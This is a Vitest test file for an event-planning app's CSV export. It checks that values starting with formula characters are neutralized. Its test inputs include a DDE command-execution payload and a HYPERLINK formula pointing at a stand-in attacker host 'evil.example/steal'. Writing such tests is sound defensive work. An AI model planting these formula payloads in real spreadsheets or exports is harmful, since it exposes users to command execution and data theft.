import { describe, expect, it } from 'vitest';
import { csvEscape } from '@/utils/csv';
import { tasksToCSV } from '@/data/repositories/backupRepository';
import type { Task } from '@/types';

describe('csvEscape (section 34: CSV formula injection protection)', () => {
  it('prefixes a leading = with a single quote, then applies standard CSV quoting since the value also contains a quote', () => {
    expect(csvEscape('=cmd|"/c calc"!A1')).toBe('"\'=cmd|""/c calc""!A1"');
  });

  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1:A9)'])('neutralizes a leading formula-trigger character in %s', (value) => {
    const escaped = csvEscape(value);
    expect(escaped.startsWith("'") || escaped.startsWith('"\'')).toBe(true);
    expect(escaped).not.toMatch(/^[=+\-@]/);
  });

  it('leaves an ordinary value unchanged', () => {
    expect(csvEscape('Regular Guest Name')).toBe('Regular Guest Name');
    expect(csvEscape(42)).toBe('42');
    expect(csvEscape(undefined)).toBe('');
    expect(csvEscape(null)).toBe('');
  });

  it('still quotes values containing a comma, quote, or newline', () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('a"b')).toBe('"a""b"');
    expect(csvEscape('a\nb')).toBe('"a\nb"');
  });

  it('quotes a formula-prefixed value that also contains a comma', () => {
    expect(csvEscape('=A1,B1')).toBe(`"'=A1,B1"`);
  });
});

describe('CSV export builders never emit an un-neutralized formula cell (section 34)', () => {
  it('tasksToCSV neutralizes a malicious task title', () => {
    const now = new Date().toISOString();
    const task: Task = {
      id: 't1',
      title: '=HYPERLINK("http://evil.example/steal","click")',
      description: '',
      event: 'Wedding',
      workstream: 'Governance',
      owner: 'Owner',
      status: 'Not Started',
      priority: 'Medium',
      dependencies: [],
      completionCriteria: '',
      tags: [],
      subtasks: [],
      createdAt: now,
      updatedAt: now,
    };
    const csv = tasksToCSV([task]);
    const firstDataLine = csv.split('\n')[1];
    expect(firstDataLine.startsWith('=') || firstDataLine.startsWith('+') || firstDataLine.startsWith('-') || firstDataLine.startsWith('@')).toBe(false);
    expect(firstDataLine).toContain("'=HYPERLINK");
  });
});
